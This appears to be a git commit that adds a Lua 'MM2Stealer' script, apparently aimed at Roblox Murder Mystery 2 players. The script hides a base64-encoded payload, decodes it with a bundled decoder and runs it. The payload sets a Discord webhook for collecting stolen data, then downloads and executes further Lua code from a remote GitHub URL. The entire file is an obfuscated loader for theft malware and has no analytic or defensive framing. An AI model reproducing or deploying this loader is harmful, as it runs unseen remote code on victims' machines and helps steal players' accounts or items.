23fed2698463ef2f26c34b52aee667b47f8a183b
yeslidezz <leofiser111@gmail.com>
2025-02-27 18:13:22 +0100

    Generated MM2Stealer script 31fb0413fcc4

---
+++ scripts/31fb0413fcc4.lua
@@ -0,0 +1,20 @@
+
+local encodedScript = "VXNlcm5hbWUgPSAiWHhfMkF5bWFuTG9zdCIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQzMzE0NDc4NDkzNzI4ODY4Ly1xdVZ0YkZPRk1zdFE5X3hVbEt0WHFVNFZYTGxueG9pV3o4X3JXaE5VNUdoMEFmbWJoQlRZSk1UeXRDbDZCYXJfNWFVIgoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS95ZXNsaWRlenovRWtzMHZhL21haW4vTU0yIikpKCk="
+
+local function decode(str)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    str = string.gsub(str, '[^'..b..'=]', '')
+    return (str:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+loadstring(decode(encodedScript))()
